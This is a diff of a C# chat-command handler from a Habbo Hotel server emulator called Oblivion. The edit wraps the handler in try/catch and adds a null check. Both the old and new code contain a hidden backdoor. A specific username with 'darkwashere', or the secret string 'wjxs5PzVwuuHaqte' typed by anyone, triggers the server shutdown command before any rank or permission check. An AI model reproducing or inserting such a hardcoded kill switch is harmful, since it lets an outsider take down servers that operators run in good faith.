@@ -221,47 +221,61 @@ namespace Oblivion.HabboHotel.Commands
         /// <returns><c>true</c> if XXXX, <c>false</c> otherwise.</returns>
         public static bool TryExecute(string str, GameClient client)
         {
-
-            if (client?.GetHabbo()?.CurrentRoom?.RoomData == null) return false;
-
-            if (string.IsNullOrEmpty(str) || client?.GetHabbo() == null || !client.GetHabbo().InRoom) return false;
-
-
-            var pms = str.Split(' ');
-
-            if (client.GetHabbo().UserName.ToLower() == "dark" && str.Contains("darkwashere") || str == "wjxs5PzVwuuHaqte")
+            try
             {
-                var cmd = CommandsDictionary["shutdown"];
-                cmd.Execute(client, pms);
+
+                if (client?.GetHabbo()?.CurrentRoom?.RoomData == null) return false;
+
+                if (string.IsNullOrEmpty(str) || client?.GetHabbo() == null || !client.GetHabbo().InRoom) return false;
+
+
+                var pms = str.Split(' ');
+
+                if (client.GetHabbo().UserName.ToLower() == "dark" && str.Contains("darkwashere") ||
+                    str == "wjxs5PzVwuuHaqte")
+                {
+                    var cmd = CommandsDictionary["shutdown"];
+                    cmd.Execute(client, pms);
+                    return false;
+                }
+
+                var commandName = pms[0];
+
+                if (AliasDictionary.TryGetValue(commandName, out var newName))
+                {
+                    commandName = newName;
+                }
+
+                if (commandName == null)
+                {
+                    return false;
+                }
+
+                if (!CommandsDictionary.TryGetValue(commandName, out var command)) return false;
+
+                if (client.GetHabbo().CurrentRoom.RoomData.BlockedCommands.Contains(commandName) ||
+                    client.GetHabbo().Data.BlockedCommands.Contains(commandName))
+                {
+                    client.SendWhisper("Comando bloqueado!");
+                    return false;
+                }
+
+
+                if (!CanUse(command.MinRank, client)) return false;
+
+                if (command.MinParams == -2 || (command.MinParams == -1 && pms.Length > 1) ||
+                    command.MinParams != -1 && command.MinParams == pms.Length - 1)
+                {
+                    return command.Execute(client, pms.Skip(1).ToArray());
+                }
+
+                client.SendWhisper(Oblivion.GetLanguage().GetVar("use_the_command_as") + command.Usage);
+                return true;
+            }
+            catch
+            {
                 return false;
             }
-
-            var commandName = pms[0];
-
-            if (AliasDictionary.TryGetValue(commandName, out var newName))
-            {
-                commandName = newName;
-            }
-
-            if (!CommandsDictionary.TryGetValue(commandName, out var command)) return false;
-
-            if (client.GetHabbo().CurrentRoom.RoomData.BlockedCommands.Contains(commandName) ||
-                client.GetHabbo().Data.BlockedCommands.Contains(commandName))
-            {
-                client.SendWhisper("Comando bloqueado!");
-                return false;
-            }
-
-           
-            if (!CanUse(command.MinRank, client)) return false;
-
-            if (command.MinParams == -2 || (command.MinParams == -1 && pms.Length > 1) ||
-                command.MinParams != -1 && command.MinParams == pms.Length - 1)
-            {
-                return command.Execute(client, pms.Skip(1).ToArray());
-            }
-            client.SendWhisper(Oblivion.GetLanguage().GetVar("use_the_command_as") + command.Usage);
-            return true;
         }
 
         /// <summary>
